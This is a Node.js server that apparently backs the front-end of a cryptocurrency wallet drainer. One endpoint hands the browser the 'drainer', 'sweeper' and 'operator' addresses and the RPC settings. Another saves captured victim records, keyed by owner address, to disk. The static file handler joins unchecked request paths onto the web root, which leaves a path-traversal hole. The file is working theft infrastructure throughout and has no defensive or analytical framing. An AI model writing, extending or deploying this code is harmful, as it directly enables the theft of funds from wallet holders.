import { createServer } from "node:http";
import { readFile, writeFile, mkdir } from "node:fs/promises";
import { extname, join } from "node:path";

const PORT = Number(process.env.PORT || 8787);
const ROOT = new URL("./web", import.meta.url).pathname;
const TYPES = { ".html": "text/html", ".js": "text/javascript", ".css": "text/css", ".json": "application/json" };

await mkdir(new URL("./captures", import.meta.url), { recursive: true });

function parseEnv(text) {
  const out = {};
  for (const line of text.split("\n")) {
    const m = line.match(/^\s*([A-Z0-9_]+)\s*=\s*"?([^"\n]*)"?\s*$/);
    if (m) out[m[1]] = m[2];
  }
  return out;
}

createServer(async (req, res) => {
  const url = req.url.split("?")[0];

  if (req.method === "GET" && url === "/api/config") {
    const cfg = {};
    try {
      Object.assign(cfg, JSON.parse(await readFile(new URL("./.deployments.json", import.meta.url), "utf8")));
    } catch {}
    try {
      Object.assign(cfg, parseEnv(await readFile(new URL("./.env", import.meta.url), "utf8")));
    } catch {}
    res.writeHead(200, { "content-type": "application/json" }).end(
      JSON.stringify({
        rpc: process.env.RPC_URL || cfg.RPC_URL,
        drainer: cfg.drainer,
        sweeper: cfg.sweeper,
        operator: cfg.operator,
        chainId: cfg.CHAIN_ID,
      }),
    );
    return;
  }

  if (req.method === "POST" && url === "/api/capture") {
    let body = "";
    for await (const chunk of req) body += chunk;
    let data;
    try {
      data = JSON.parse(body);
      if (!data.kind || !data.owner) throw new Error("kind/owner obrigatorios");
    } catch (err) {
      res.writeHead(400).end(JSON.stringify({ error: err.message }));
      return;
    }
    const name = `${Date.now()}-${data.kind}-${data.owner.slice(0, 10)}.json`;
    await writeFile(join(ROOT, "..", "captures", name), JSON.stringify(data, null, 2));
    console.log(`capture ${name}`);
    res.writeHead(200, { "content-type": "application/json" }).end(JSON.stringify({ ok: true, file: `captures/${name}` }));
    return;
  }

  const path = req.url === "/" ? "/index.html" : req.url.split("?")[0];
  try {
    const file = await readFile(join(ROOT, path));
    res.writeHead(200, { "content-type": TYPES[extname(path)] || "application/octet-stream" }).end(file);
  } catch {
    res.writeHead(404).end("not found");
  }
}).listen(PORT, () => console.log(`front-end em http://127.0.0.1:${PORT}`));
